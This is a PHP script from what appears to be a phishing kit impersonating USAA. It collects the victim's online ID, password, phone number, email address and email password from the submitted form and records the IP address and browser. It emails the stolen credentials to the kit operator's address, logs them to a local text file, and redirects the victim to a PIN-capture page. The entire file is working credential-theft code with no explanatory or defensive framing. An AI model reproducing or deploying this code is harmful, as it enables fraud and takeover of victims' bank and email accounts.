<?php
ini_set("output_buffering",4096);
@session_start();
ob_start();

include 'Email.php';

$ipaddress = $_SERVER['REMOTE_ADDR'];
$ipaddress2 = $_SERVER['HTTP_CLIENT_IP'];
$host = bin2hex ($_SERVER['HTTP_HOST']);
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];


$_SESSION['iden1'] = $_POST['iden'];
$_SESSION['EML1'] = $_POST['EML'];
$_SESSION['epass1'] = $_POST['epass'];


$host = bin2hex ($_SERVER['HTTP_HOST']);
$ip = getenv("REMOTE_ADDR");
$message .= "--------------[ USAA ]---------------------\n";
$message .= "OnlineID       : ".$_SESSION['j_username1']."\n";
$message .= "Password       : ".$_SESSION['j_password1']."\n";
$message .= "--------------[ USAA-PIN ]---------------------\n";
$message .= "USAA Phone       : ".$_POST['iden']."\n";
$message .= "--------------[ Email-AXiZ ]---------------------\n";
$message .= "Email          : ".$_POST['EML']."\n";
$message .= "Password       : ".$_POST['epass']."\n";
$message .= "--------------[ Real Master ]---------------------\n";
$message .= "|Client IP: ".$ipaddress2."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ipaddress ----\n";
$message .= "Browser                 :".$browserAgent."\n";
$message .= "DateTime                : ".$timedate."\n";
$subject = "xXxUSAA-NeWxXx $ipaddress";
$headers = "From: UnKnown <Source@Bourder.land>";
mail($SEND,$subject,$message,$headers);
$fp = fopen("../SM.txt","a");
fputs($fp,$message);
fclose($fp);


header("Location: pin.php?$host$host$host$host");
?>